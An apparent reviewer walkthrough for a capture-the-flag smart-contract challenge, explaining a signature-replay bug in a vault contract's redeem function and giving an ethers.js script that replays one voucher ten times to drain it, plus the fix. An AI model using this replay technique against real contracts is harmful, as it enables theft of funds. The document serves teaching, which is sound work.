# Signature Replay walkthrough

This note is for reviewers. It is not copied into the challenge image.

## Setup

- `SignatureVault` is deployed with **10 ETH**. Its `operator` is a throwaway
  keypair whose private key was used only to precompute one voucher; the key is
  **not** in the repo or the image.
- The player is given one voucher: the operator's signature over
  `keccak256(abi.encodePacked(to, amount))` (EIP-191 prefixed) authorizing
  **1 ETH to Hardhat account #1** (`0x7099...79C8`). The voucher `(v, r, s)` is
  published on the contract page and via `GET /status`.

## The vulnerability

`redeem(to, amount, v, r, s)` recovers the signer and checks it equals
`operator`, then pays out — but it records **no nonce and no used-signature
flag**. The same voucher can be submitted any number of times. The signed
message is also not bound to the vault address or a chain id, but the missing
replay protection is the core bug.

## Solve

Call `redeem` with the published voucher repeatedly (10x) until the vault
balance is `0`:

```js
const { ethers } = require("ethers");
const provider = new ethers.JsonRpcProvider("http://127.0.0.1:8545");
// Account #1 (the beneficiary) — any funded account can send the tx.
const wallet = new ethers.Wallet(
  "0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d",
  provider
);
const vault = new ethers.Contract(
  VAULT_ADDRESS,
  ["function redeem(address,uint256,uint8,bytes32,bytes32)"],
  wallet
);
const v = { to: "0x70997970C51812dc3A010C7d01b50e0d17dc79C8",
            amount: "1000000000000000000", v: 28,
            r: "0xee133ccdc3556d276a3e656cb36182de5b123157bc771a4b0d7146e9eb07b139",
            s: "0x48b87b28fd2bc9c43db7522e63a4b5ae7fdb5d7fae7e71886f21c544fa8ffbcd" };
for (let i = 0; i < 10; i++) {
  await (await vault.redeem(v.to, v.amount, v.v, v.r, v.s)).wait();
}
```

`solved()` returns true once `totalReleased > 0 && balance == 0`. The solve API
then returns the flag. The flag is stored only in `challenge/flag.txt`.

## The fix (what players should learn)

Add replay protection: a per-beneficiary nonce included in the signed message,
or a `mapping(bytes32 => bool) used` keyed on the message digest, plus bind the
message to the vault address and chain id (EIP-712 domain separator).
